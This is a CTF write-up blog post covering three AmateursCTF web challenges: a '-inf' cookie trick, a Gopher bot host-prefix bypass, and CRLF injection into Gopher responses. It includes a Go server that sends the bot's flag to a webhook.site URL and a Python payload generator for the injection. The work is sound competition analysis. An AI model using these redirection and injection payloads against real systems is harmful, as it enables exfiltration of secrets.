---
layout: post
title: AmateursCTF Web Writeup
tags: [ctf, ctf writeup, ctf web]
---

[AmateursCTF](https://ctf.amateurs.team/)  
[Event on CTFtime](https://ctftime.org/event/1983)

3 web challenge writeups in this post:
- [wait-an-eternity](#wait-an-eternity)
- [go-gopher](#go-gopher)
- [gopher-revenge](#gopher-revenge) (got first blood on this challenge! Not finishing the detailed writeup, but with a summary)

## wait-an-eternity

- Description: 
> My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I've been waiting a couple days and it's still asking me to wait. I'm getting a little impatient, could you help me get the flag?
- Author: voxal
- Entry point: [waiting-an-eternity.amt.rs](https://waiting-an-eternity.amt.rs/)

### First eternity

The webpage just had text "just wait an eternity". When inspect the request, there is a "Refresh" header with a huge value and url with a secret code.

![First eternity](/assets/image/amateursctf-web-writeup/first-eternity.png)

### Another eternity

Visit the url in the "Refresh" header, it shows a page saying "welcome. please wait another eternity.".

Inspect the request, it sets a cookie "time" with a value appears to be the current timestamp like `1690326049.1573777`. With the cookie set, refresh the page, and the page shows text like "you have not waited an eternity. you have only waited 228.13574051856995 seconds". The time mentioned in the message appears to be the difference between the current timestamp and the timestamp in the cookie.

Sets the cookie to a large value, it says have only waited a large negative number of seconds. Sets the cookie to a negative value, it says have waited a large number of seconds, but there is still no flag.

The message told to wait an eternity, but how long is an eternity? The internet says the definitions of eternity is "[infinite time](https://www.dictionary.com/browse/eternity)", "[time that never ends](https://dictionary.cambridge.org/dictionary/english/eternity)" or "a very long time". Hmm, how long the website would consider to be an eternity? Look up gunicorn that appears to be the web server according to the response header, the website is running Python. In Python, a number (except `-inf`) minus `-inf` would be `inf`. So, if the cookie value is `-inf`, the number of seconds have waited would be `inf`, and website would consider it to be an eternity.

![Another eternity](/assets/image/amateursctf-web-writeup/another-eternity.png)

After two eternities, I got the flag:

```
amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
```

#### Speculation

The web server is probably taking value from the cookie, and use `float()` to convert it to a float, thus `float('-inf')` would be float `-inf`. Number of seconds waited is calculated by subtracting the float value from the current timestamp. (Actually, yes, can confirm with the [source code](https://github.com/les-amateurs/AmateursCTF-Public/blob/b9b40a55969e3e1553ed14e66bb460a9370db509/2023/web/waiting-an-eternity/main.py#L18))

## go-gopher

This challenge was cheesed with subdomains or certain domain names because it only checks the host prefix. There is a revenge challenge [gopher-revenge](#gopher-revenge).

- Description:
> psst... i know flag sharing isn't allowed, and i found this page where someone seems to be recieving flags from someone else. can you somehow find a way to hijack this site so it gives me flags? thanks.
- Author: voxal
- Entry point:
  - gopher://amt.rs:31290/
  - [gopher-bot.amt.rs](https://gopher-bot.amt.rs/)
- Downloads:
  - [bot.go](https://amateurs-prod.storage.googleapis.com/uploads/7c93488d980366dd6255b08e1bb8ac751565508920151011276c964116df5479/bot.go)
  - [main.go](https://amateurs-prod.storage.googleapis.com/uploads/b652421619610ac09116d516ac4f659ac95d73402048c96e29cfb2ad183104f7/main.go)

### The challenge

Submit and Visit function for bot

```go
func Submit(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	u, err := url.Parse(r.Form.Get("url"))
	if err != nil || !strings.HasPrefix(u.Host, "amt.rs") {
		w.Write([]byte("Invalid url"))
		return
	}
	w.Write([]byte(Visit(r.Form.Get("url"))))
}
func Visit(url string) string {
	fmt.Println(url)
	res, err := gopher.Get(url)
	if err != nil {
		return fmt.Sprintf("Something went wrong: %s", err.Error())
	}
	h, _ := res.Dir.ToText()
	fmt.Println(string(h))
	url, _ = strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(url)
	_, err = http.Post(url, "text/plain", bytes.NewBuffer(flag))
	if err != nil {
		return "Failed to make request"
	}
	return "Successful visit"
}
```

The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.

The bot does restrict the host of the Gopher url to start with `amt.rs`, however this can be easily bypassed with subdomains like `gopher://amt.rs.cjxol.com:31290/`. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.

![go-gopher flag](/assets/image/amateursctf-web-writeup/go-gopher-flag.png)

Here is my Gopher server code:
```go
package main
import (
        "fmt"
        "log"
        "git.mills.io/prologic/go-gopher"
)
func hello(w gopher.ResponseWriter, r *gopher.Request) {
        w.WriteInfo("Hello!")
        w.WriteInfo("again")
        w.WriteItem(&gopher.Item{
                Selector:       "https://webhook.site/[reducted]",
        })
        fmt.Println("hello")
}
func main() {
        gopher.HandleFunc("/", hello)
        log.Fatal(gopher.ListenAndServe("0.0.0.0:31337", nil))
}
```

Here is the Gopher response:
```
iHello!         error.host      1
iagain          error.host      1
        https://webhook.site/[reducted]       ::      31337
.
```

## gopher-revenge

This writeup is updated on 28 July 2023.

Got first blood on this challenge (this is POG!). The challenge had a total of 19 solves during the CTF.

- Description:
  > you guys are going to regret ever crossing me.

  Later added the following clarification/hint due to a few teams with very close solutions fails submitting the correct flag:
  > the flag in "flag.txt" is the exact same flag you need to submit
- Author: voxal
- Entry point:
  - The Gopher endpoint gopher://amt.rs:31290/ for [go-gopher](#go-gopher) is still useable to this challenge (implied)
  - [hell.amt.rs](https://hell.amt.rs) (the bot user interface)
- Downloads
  - The Gopher server code is still the same as for [go-gopher](#go-gopher) (implied)
  - [bot.go](https://amateurs-prod.storage.googleapis.com/uploads/8d307d2b5f9f5c4075fbfe1b7d6ae10c01508306c94ab073d3895900d0052842/bot.go) updated from [go-gopher](#go-gopher)

### The challenge

Submit and Visit function of the bot.

```go
func Submit(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	u, err := url.Parse(r.Form.Get("url"))
	if err != nil || u.Host != "amt.rs:31290" {
		w.Write([]byte("Invalid url"))
		return
	}
	w.Write([]byte(Visit(r.Form.Get("url"))))
}
func Visit(gopherURL string) string {
	fmt.Println(gopherURL)
	res, err := gopher.Get(gopherURL)
	if err != nil {
		return fmt.Sprintf("Something went wrong: %s", err.Error())
	}
	rawURL, _ := strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(rawURL)
	u, err := url.Parse(rawURL)
	etldpo, err2 := publicsuffix.EffectiveTLDPlusOne(u.Host)
	if err != nil || err2 != nil || etldpo != "amt.rs" {
		return "Invalid url"
	}
	resp, err := http.Post(u.String(), "application/x-www-form-urlencoded",
		bytes.NewBuffer([]byte(fmt.Sprintf(
		"username=%s&password=%s", randomString(20), flag))))
	if err != nil {
		return "Failed to make request"
	}
	cookies := resp.Cookies()
	token := ""
	for _, c := range cookies {
		if c.Name == "token" {
			token = c.Value
		}
	}
	if token != "" {
		return fmt.Sprintf("Thanks for sending in a flag! Use the following token once i get the gopher-catcher frontend setup: %s", token)
	} else {
		return "Something went wrong, my sever should have sent a cookie back but it didn't..."
	}
}
```

Similar to before as in [go-gopher](#go-gopher), the bot makes Gopher request to an URL we provide, and then makes a HTTP POST request to a URL extracted from the selector of the second item in the Gopher response. The HTTP request contains a random string as "username" and the flag as "password". The value of the cookie named "token" from the HTTP response will then be shown to us.

### Take control of the URL in the response

Unlike in [go-gopher](#go-gopher) with the cheese to bypass the Gopher URL check, I could not find a way to bypass the check with `u.Host != "amt.rs:31290"`. This means I have to provide the Gopher URL to this host.

#### The Gopher Protocol

Reading [RFC 1436](https://datatracker.ietf.org/doc/html/rfc1436#section-2) about the Gopher protocol, Gopher is a text-based protocol. The server responses with each item in each line terminated with CR LF, and a period "." on its own line after the last item. For each line, the first character describes the type of the item, and all character following until a tab is the "user display string". Each item after ths is also tab-separated. The next field is "selector string". The next two fields are the domain-name and port for the document or directory described in this line.

In the example requests to the challenge server:

```
$ nc amt.rs 31290
/submit/lol
iHello lol              error.host      1
iPlease send a post request containing your flag at the server down below.              error.host      1
0Submit here! (gopher doesn't have forms D:)    URL:http://amt.rs/gophers-catcher-not-in-scope  error.host      1
.

```

The client sends the line "magic string" `/submit/` for the file/directory. In the response, the first character of each line "i" means the item is for info, 0 means the item is a document (though in this challenge I do not need to care abut the difference). In the 3rd item, the selector is "URL:http://amt.rs/gophers-catcher-not-in-scope".

#### The challenge Gopher server

The interesting function in the Gopher server is `submit`, as it appears to point to a "non-exist" flag catcher" (which I confirmed with the CTF organisers that is indeed does not exist). Also the function makes use of the client input.

```go
func submit(w gopher.ResponseWriter, r *gopher.Request) {
	name := strings.Split(r.Selector, "/")[2]
	undecoded, err := url.QueryUnescape(name)
	if err != nil {
		w.WriteError(err.Error())
	}
	w.WriteInfo(fmt.Sprintf("Hello %s", undecoded))
	w.WriteInfo("Please send a post request containing your flag at the server down below.")
	w.WriteItem(&gopher.Item{
		Type:        gopher.FILE,
		Selector:    "URL:http://amt.rs/gophers-catcher-not-in-scope",
		Description: "Submit here! (gopher doesn't have forms D:)",
		Host:        "error.host",
		Port:        1,
	})
}
func main() {
	mux := gopher.NewServeMux()
	mux.HandleFunc("/", index)
	mux.HandleFunc("/submit/", submit)
	log.Fatal(gopher.ListenAndServe("0.0.0.0:7000", mux))
}
```

Noticing the string after the 2nd "/" in the selector or "magic string" in the request is included in the response. The bot takes the 3rd item in the response, and I am able to inject into the 1st line. So it is possible to make the selector in the 3rd item being a URL we want, and push the items after the 1st item in the original response further down.

#### Gopher URL

[RFC 4266](https://datatracker.ietf.org/doc/html/rfc4266) specifies the Gopher URI scheme. I then used the information to build the Gopher URL for the Gopher request.

In the URL example

```
gopher://amt.rs:31290/1/submit/lol
```

where `1` is the "gophertype", with `/submit/lol` being the "selector string".

### Putting it together

Putting it together and generate the payload with the following Python script:

```python
from pwn import *
r = remote('amt.rs', 31290)
TAB = '%09'
CRLF = '%0D%0A'
# url = 'https://cps.amt.rs/register.php'
urlencoded_url = 'https%3A%2F%2Fcps%2Eamt%2Ers%2Fregister.php'
url_line_content = f'0S{TAB}{urlencoded_url}{TAB}error.host{TAB}1'
s = f'/submit/lol{TAB}{TAB}error.host{TAB}1{CRLF}iA{TAB}{TAB}error.host{TAB}1{CRLF}{url_line_content}{CRLF}iA'
print('[payload] Magic string:', s)
r.send(s.encode())
r.send(b'\r\n')
response = r.clean(timeout=1)
print('[response] Response:')
print(response.decode())
s = s.replace('%', '%25')
print('[payload] Gopher URL:', f'gopher://amt.rs:31290/1/{s}')
```

![Payload](/assets/image/amateursctf-web-writeup/gopher-revenge-payload.png)

This results in the bot POST to `https://cps.amt.rs/register.php` with the flag as the password. The URL is for another SQLi challenge (which was worth 0 point because of the solution was leaked), which I did not manage to solve (though I tried to solve it and only the next morning I realised I did not need to solve it and I already had the solution for gopher-revenge). The `/register.php` takes exactly username and password as the POST parameters, and returns a cookie named "token" in the response. The bot then shows the value of the cookie. When authenticated with the cookie, the site shows the password of the user.

![CPS page showing password of the authenticated user](/assets/image/amateursctf-web-writeup/cps-authenticated.png)

Copying the password into the flag submission did not work. I did ask the CTF organisers to confirm the code running on the server for the SQLi challenge is the same as the downloadables, and did not do anything special to the flag. The CTF organisers confirmed the code is the same, and said a few teams have stuck here. They then added "the flag in "flag.txt" is the exact same flag you need to submit" to the challenge description as a hint. Seeing the space showing in the password, I then realised it could have been a "+" in the original flag. I then tried to submit the flag with "+" instead of space, and it worked. I realised as I recently had the issue with "+" in the URL.
